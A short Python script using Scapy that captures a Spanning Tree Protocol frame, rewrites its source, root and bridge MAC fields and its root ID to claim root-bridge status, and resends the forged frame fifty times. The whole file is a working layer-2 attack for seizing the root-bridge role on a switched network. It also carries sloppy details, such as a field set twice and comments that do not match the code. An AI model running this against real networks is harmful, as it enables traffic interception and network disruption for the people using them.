from scapy.all import *

#Capture STP frama
pkt = sniff(filter="ether dst 3c:f9:f0:21:f8:07", count=1)

#Change the Mac address in the frame to the following:
pkt[0].src = "5c:cd:5b:3a:8c:f2"

#Set RootID
pkt[0].rootid =0

#Set Rootmac
pkt[0].rootmac = "5c:cd:5b:3a:8c:f2"

#set BridgeID
pkt[0].bridgemac = 0

#Set Rootmac
pkt[0].bridgemac = "5c:cd:5b:3a:8c:f2"
pkt[0].show()

#Send change frame back into the network:
for i in range (0,50):
    sendp(pkt[0], loop=0, verbose=1)
    time.sleep(1)
    pkt[0].show()
